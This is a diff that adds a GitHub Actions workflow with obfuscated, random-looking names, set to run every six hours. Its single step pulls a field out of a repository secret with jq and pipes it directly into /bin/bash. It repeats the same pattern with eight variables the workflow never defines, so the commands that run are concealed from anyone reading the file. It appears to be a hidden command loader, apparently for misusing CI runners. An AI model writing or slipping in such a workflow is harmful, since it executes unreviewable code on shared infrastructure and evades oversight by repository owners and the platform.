@@ -1,0 +1,26 @@
+name: wuhaojie1239
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wuhaojie1239
+        env:
+          aov085: ${{ secrets.aov085 }}
+        run: |
+          echo $aov085 | jq -r .cmde73348 | /bin/bash
+          echo $u979 | jq -r .aty7504 | /bin/bash
+          echo $azh6598 | jq -r .twv13 | /bin/bash
+          echo $od24 | jq -r .dbnu19949 | /bin/bash
+          echo $qu092 | jq -r .k9 | /bin/bash
+          echo $sbet16 | jq -r .yakpx10990 | /bin/bash
+          echo $hqcji88896 | jq -r .eak19 | /bin/bash
+          echo $vtlli519 | jq -r .wxwa3 | /bin/bash
+          echo $vq2 | jq -r .csmo23441 | /bin/bash
+
